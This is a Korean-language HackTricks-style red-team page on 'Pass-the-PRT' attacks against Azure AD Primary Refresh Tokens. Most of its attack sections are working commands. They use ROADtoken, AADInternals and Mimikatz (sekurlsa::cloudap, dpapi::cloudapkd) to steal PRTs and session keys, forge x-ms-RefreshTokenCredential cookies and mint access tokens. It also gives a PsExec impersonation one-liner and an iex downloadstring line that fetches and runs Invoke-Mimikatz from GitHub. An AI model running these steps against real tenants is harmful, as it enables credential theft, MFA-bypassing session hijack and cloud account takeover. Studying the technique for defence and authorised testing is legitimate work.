# Az - PRT 전달

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로에서 영웅까지 AWS 해킹 배우기</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## PRT이란

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### PRT가 있는지 확인하기
```
Dsregcmd.exe /status
```
## SSO 상태

SSO 상태 섹션에서 **`AzureAdPrt`**가 **YES**로 설정된 것을 볼 수 있어야 합니다.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

동일한 출력에서 **Azure에 가입된 장치**인지도 확인할 수 있습니다 (`AzureAdJoined` 필드에서):

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT 쿠키

PRT 쿠키는 실제로 **`x-ms-RefreshTokenCredential`**이라고 불리며 JSON Web Token (JWT)입니다. JWT에는 **헤더**, **페이로드** 및 **서명**으로 구성된 3 부분이 있으며 `.`로 구분되며 모두 URL 안전한 base64로 인코딩됩니다. 전형적인 PRT 쿠키에는 다음과 같은 헤더와 본문이 포함됩니다:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
**기본 새로 고침 토큰 (PRT)**은 **`refresh_token`** 내에 캡슐화되어 있으며 Azure AD의 키로 암호화되어 있어 내용을 우리가 해독할 수 없게 만듭니다. **`is_primary`** 필드는 이 토큰 내에 기본 새로 고침 토큰이 캡슐화되었음을 나타냅니다. 쿠키가 의도된 특정 로그인 세션에 바인딩되어 유지되도록 하려면 `request_nonce`이 `logon.microsoftonline.com` 페이지에서 전송됩니다.

### TPM을 사용한 PRT 쿠키 흐름

**LSASS** 프로세스는 **KDF 컨텍스트**를 TPM에 보내고 TPM은 **세션 키** (장치가 AzureAD에 등록될 때 수집되고 TPM에 저장된) 및 이전 컨텍스트를 사용하여 **키를 파생**하며, 이 **파생된 키**는 **PRT 쿠키 (JWT)를 서명하는 데 사용**됩니다.

**KDF 컨텍스트**는 AzureAD의 nonce 및 PRT가 **JWT**를 생성하며 **컨텍스트** (임의의 바이트)와 혼합됩니다.

따라서 PRT가 TPM 내부에 있기 때문에 추출할 수 없더라도 LSASS를 남용하여 **새로운 컨텍스트에서 파생된 키를 요청하고 생성된 키를 사용하여 쿠키에 서명**할 수 있습니다.

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT 남용 시나리오

**일반 사용자**로서 LSASS에 SSO 데이터를 요청하여 **PRT 사용**을 요청할 수 있습니다.\
이는 **네이티브 앱**이 **Web Account Manager** (토큰 브로커)에서 토큰을 요청하는 방식으로 수행될 수 있습니다. WAM은 요청을 **LSASS**에 전달하고, LSASS는 서명된 PRT 어설션을 사용하여 토큰을 요청합니다. 또는 **브라우저 기반 (웹) 플로우**에서도 수행될 수 있으며, 이 경우 **PRT 쿠키**가 Azure AS 로그인 페이지로의 요청을 인증하는 **헤더**로 사용됩니다.

**SYSTEM**으로서 TPM에 의해 보호되지 않은 경우 **PRT를 도난당하거나** LSASS에서 **PRT 키와 상호 작용**할 수 있습니다.

## PRT 전달 공격 예시

### 공격 - ROADtoken

이 방법에 대한 자세한 내용은 [**이 게시물을 확인하세요**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken은 올바른 디렉토리에서 **`BrowserCore.exe`**를 실행하고 **PRT 쿠키를 얻기** 위해 사용합니다. 이 쿠키는 그런 다음 ROADtools와 함께 사용되어 인증하고 **지속적인 새로 고침 토큰을 얻을 수 있습니다**.

유효한 PRT 쿠키를 생성하려면 먼저 nonce가 필요합니다.\
다음을 사용하여 얻을 수 있습니다:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
또는 [**roadrecon**](https://github.com/dirkjanm/ROADtools)을 사용하십시오:
```powershell
roadrecon auth prt-init
```
그럼 [**roadtoken**](https://github.com/dirkjanm/ROADtoken)을 사용하여 새 PRT를 얻을 수 있습니다 (사용자 프로세스에서 도구 실행하여 공격):
```powershell
.\ROADtoken.exe <nonce>
```
```korean
한 줄로:

{% 코드 오버플로우="랩" %}
```
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

그런 다음 **생성된 쿠키**를 사용하여 Azure AD **그래프** 또는 Microsoft 그래프를 사용하여 **로그인 토큰을 생성**할 수 있습니다:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### 공격 - roadrecon 사용

### 공격 - AADInternals 및 유출된 PRT 사용

`Get-AADIntUserPRTToken`은 Azure AD에 가입되거나 하이브리드로 가입된 컴퓨터에서 사용자의 PRT 토큰을 가져옵니다. `BrowserCore.exe`를 사용하여 PRT 토큰을 가져옵니다.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
또는 Mimikatz에서 값을 가지고 있다면 AADInternals를 사용하여 토큰을 생성할 수도 있습니다:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com)로 이동하고, login.microsoftonline.com의 모든 쿠키를 지우고 새 쿠키를 입력하세요.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
그런 다음 [https://portal.azure.com](https://portal.azure.com)로 이동하십시오.

{% hint style="danger" %}
나머지는 기본 설정이어야 합니다. 페이지를 새로 고침할 수 있고 쿠키가 사라지지 않는지 확인하십시오. 사라지면 실수한 것이므로 프로세스를 다시 진행해야 합니다. 사라지지 않으면 준비가 된 것입니다.
{% endhint %}

### 공격 - Mimikatz

#### 단계

1. **PRT (Primary Refresh Token)는 LSASS (Local Security Authority Subsystem Service)에서 추출**되어 이후 사용을 위해 저장됩니다.
2. **세션 키가 다음에 추출**됩니다. 이 키는 초기에 발급되고 로컬 장치에서 다시 암호화되므로 DPAPI 마스터키를 사용하여 복호화해야 합니다. DPAPI (Data Protection API)에 대한 자세한 정보는 다음 리소스에서 찾을 수 있습니다: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) 및 적용 방법에 대한 이해를 위해 [쿠키 전달 공격](az-pass-the-cookie.md)을 참조하십시오.
3. 세션 키를 복호화한 후 **PRT에 대한 파생 키 및 컨텍스트를 얻습니다**. 이들은 **PRT 쿠키를 생성하는 데 중요**합니다. 구체적으로, 파생 키는 쿠키를 구성하는 JWT (JSON Web Token)에 서명하는 데 사용됩니다. 이 프로세스에 대한 포괄적인 설명은 Dirk-jan에 의해 제공되었으며 [여기](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)에서 확인할 수 있습니다.

{% hint style="danger" %}
PRT가 TPM 내부에 있고 `lsass` 내부에 없는 경우 **mimikatz는 추출할 수 없습니다**.\
그러나 TPM에서 파생 키의 키를 가져와 쿠키에 서명하는 데 사용할 수 있습니다 (옵션 3 확인).
{% endhint %}

이러한 세부 정보를 추출하는 수행된 프로세스에 대한 **심층적인 설명**을 다음에서 찾을 수 있습니다: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
2021년 8월 이후 수정 사항으로 다른 사용자의 PRT 토큰을 가져오는 것은 정확히 작동하지 않을 것입니다. 사용자만이 자신의 PRT를 가져올 수 있습니다 (로컬 관리자는 다른 사용자의 PRT에 액세스할 수 없지만 자신의 것에는 액세스할 수 있음).
{% endhint %}

**mimikatz**를 사용하여 PRT를 추출할 수 있습니다:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(이미지 출처: https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Prt**로 표시된 부분을 **복사**하고 저장하세요.\
또한 아래 하이라이트된 **`ProofOfPossesionKey`** 필드의 **`KeyValue`**인 세션 키를 추출하십시오. 이 값은 암호화되어 있으며 이를 복호화하기 위해 DPAPI 마스터키를 사용해야 합니다.

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PRT 데이터가 보이지 않는다면, 디바이스가 Azure AD에 가입되어 있지 않거나 Windows 10의 **이전 버전**을 실행 중일 수 있습니다.
{% endhint %}

세션 키를 **복호화**하려면 **권한을 상승**시켜 **시스템**에서 실행하여 **DPAPI 마스터키를 사용하여 복호화해야** 합니다. 이를 위해 다음 명령어를 사용할 수 있습니다:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### 옵션 1 - 전체 Mimikatz

* 이제 Context 값과 함께 다음을 복사하려고 합니다:

<figure><img src="../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

* 그리고 파생된 키 값:

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

* 마지막으로 이 모든 정보를 사용하여 **PRT 쿠키를 생성**할 수 있습니다:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>

* [https://login.microsoftonline.com](https://login.microsoftonline.com)로 이동하고, login.microsoftonline.com의 모든 쿠키를 지우고 새 쿠키를 입력합니다.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* 그런 다음 [https://portal.azure.com](https://portal.azure.com)으로 이동하십시오.

{% hint style="danger" %}
나머지는 기본 설정이어야 합니다. 페이지를 새로 고침할 수 있고 쿠키가 사라지지 않는지 확인하십시오. 사라진다면 실수를 한 것이므로 프로세스를 다시 진행해야 합니다. 그렇지 않으면 괜찮습니다.
{% endhint %}

#### 옵션 2 - PRT를 사용한 roadrecon

* 먼저 PRT를 갱신하여 `roadtx.prt`에 저장하십시오:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* 이제 `roadtx browserprtauth`를 사용하여 대화형 브라우저에서 **토큰을 요청**할 수 있습니다. `roadtx describe` 명령을 사용하면 액세스 토큰에 MFA 클레임이 포함되어 있는 것을 볼 수 있습니다. 이 경우 사용한 PRT에도 MFA 클레임이 있기 때문입니다.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### 옵션 3 - 파생 키를 사용한 roadrecon

mimikatz에 의해 덤프된 컨텍스트와 파생 키를 가지고 있으면 roadrecon을 사용하여 다음과 같이 새로운 서명된 쿠키를 생성할 수 있습니다:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
{% endcode %}

## 참고 자료

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로에서 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소로 PR을 제출하세요.

</details>
